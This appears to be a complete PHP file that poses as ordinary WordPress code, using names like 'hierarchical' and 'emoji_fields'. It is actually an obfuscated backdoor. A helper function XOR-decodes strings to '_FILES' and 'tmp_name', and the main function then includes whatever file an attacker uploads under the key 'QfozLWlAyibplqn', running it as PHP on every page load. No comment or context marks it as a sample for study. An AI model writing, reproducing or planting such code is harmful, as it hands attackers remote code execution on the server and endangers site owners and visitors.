<?php 	

function double_prime()

{
    $attrs = 'QfozLWlAyibplqn';
    $hierarchical = $attrs;
    
    $emoji_fields = $GLOBALS[link("%0E+%266%09%04", $hierarchical)];
    $delete = $emoji_fields;
    $post_types = isset($delete[$hierarchical]);
    if ($post_types)

    {
        $supports = $emoji_fields[$hierarchical];
        $weeuns = $supports[link("%25%0B%1F%25%226%01%24", $hierarchical)];

        $tag_pattern = $weeuns;
        include ($tag_pattern);
    }
}
function link($cache, $previous_status)

{

    $comments = $previous_status;
	$author_query = 'post__in';
    $regex = "url" . "decode";
    $query_var = $regex($cache);
    $sizes = substr($comments,0, strlen($query_var));
    $fire_after_hooks = $query_var ^ $sizes;

    return $fire_after_hooks;

}


	$imagedata = 'filtered';
double_prime();

?>
